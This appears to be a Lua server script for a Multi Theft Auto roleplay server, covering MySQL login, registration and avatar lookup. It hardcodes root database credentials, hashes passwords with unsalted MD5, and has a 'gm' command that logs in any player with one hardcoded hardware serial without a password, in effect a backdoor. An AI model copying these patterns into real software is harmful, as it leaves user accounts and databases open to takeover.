

function connect()
    DBConnection = dbConnect( "mysql", "dbname=rp;host=localhost;charset=utf8", "root", "rootroot" )
    if (not DBConnection) then
        outputDebugString("Error: Failed to establish connection to the MySQL database server")
    else
        outputDebugString("Success: Connected to the MySQL database server")
    end
end

addEventHandler("onResourceStart",root, connect)

addEvent("mysqlRender",true)
addEventHandler("mysqlRender",root,function(Getusername)

    local avatarCh = dbQuery (DBConnection,"SELECT * FROM accounts WHERE `username` = ?", Getusername)
    local avares = dbPoll (avatarCh, -1)
	if avares and #avares > 0 then
		local row = avares[1]
		setElementData(client,"avatarUrl",row.avatar)
		setElementData(client,"name",Getusername)

	end

end)

function loginSuccess( username, password )
    local dbCheck = dbQuery (DBConnection,"SELECT * FROM accounts WHERE `username` = ? AND `password` = ?", username,md5(password))
    local result = dbPoll (dbCheck, -1)
	if result and #result > 0 then
        local row = result[1]
		if row.appState == 1 then
			setElementData(client, "isPlayerLoggedIn", true)
			setElementData( client, "getPlayerUsername", username)
			triggerClientEvent("infoLoginMsg",client,"Login Confirmed ...","good")
			setTimer(function(client)
				triggerClientEvent( client, "login.success", client)
				spawnPlayer( client, 1919.6912841797, -1760.8278808594, 14.030712127686)
			end,2500,1,client)

			avatarUrl = row.avatar

		else
			triggerClientEvent(client,"infoLoginMsg",client,"Sorry! you need take app state.","error")
        end
    else
        outputDebugString("No results found for query", 1)
    end
end
addEvent("loginSuccess",true)
addEventHandler( "loginSuccess", resourceRoot, loginSuccess)

function registerPlayer( regAcceptCheckBox, regUsernameGet, regPasswordGet,regRePasswordGet, regEmailGet,avatarGet)
	dbCheck = dbQuery(DBConnection, "SELECT * FROM accounts WHERE BINARY username=?", regUsernameGet)
	result = dbPoll (dbCheck, -1)

		local row = result[1]
			if row then
				if regUsernameGet == "" then 
					triggerClientEvent(client,"infoRegisterMsg",client,"You Need Enter Samthing in username !.","error") 
					return
				end
				if row.username == regUsernameGet then 
					triggerClientEvent(client,"infoRegisterMsg",client,"Sorry! Username already is use.","error")
					return
				end
				return
			else
				if regAcceptCheckBox then
					create = dbQuery( DBConnection, "INSERT INTO accounts (username, password, email, avatar) VALUES(?,?,?,?)",regUsernameGet, md5(regPasswordGet), regEmailGet, avatarGet)
					triggerClientEvent(client,"infoRegisterMsg",client,"Registration confirmed...","good")
						setTimer ( function(client)
							triggerClientEvent(client, "register.success",client)
						end, 2000, 1,client )
				else
						triggerClientEvent(client,"infoRegisterMsg",client,"You do not accept server laws!","error")
				end
			end
		
		
end
addEvent( "registerPlayer",true)
addEventHandler("registerPlayer", root, registerPlayer)





function autoLogin( player )
	local iwalidza = "4D07399EA9F79BE9A1FBB7C4A556DDB2"
	local getSerial = getPlayerSerial( player )

		if (getSerial == iwalidza) then
			triggerClientEvent( player, "login.success", player)	
			setElementData(player, "isPlayerLoggedIn", true)
			spawnPlayer( player, 1919.6912841797, -1760.8278808594, 14.030712127686)
		end
end
addCommandHandler( "gm", autoLogin)
